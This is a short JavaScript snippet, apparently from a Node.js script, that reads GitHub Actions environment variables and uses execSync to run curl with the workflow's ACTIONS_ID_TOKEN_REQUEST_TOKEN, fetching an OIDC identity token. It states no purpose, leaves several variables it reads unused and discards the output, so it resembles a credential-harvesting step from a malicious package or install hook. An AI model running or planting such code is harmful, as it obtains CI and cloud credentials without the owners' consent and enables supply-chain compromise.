const {execSync}=require('child_process');
const ci=process.env.CI;
const ws=process.env.GITHUB_WORKSPACE;
const token=process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
execSync('curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"');
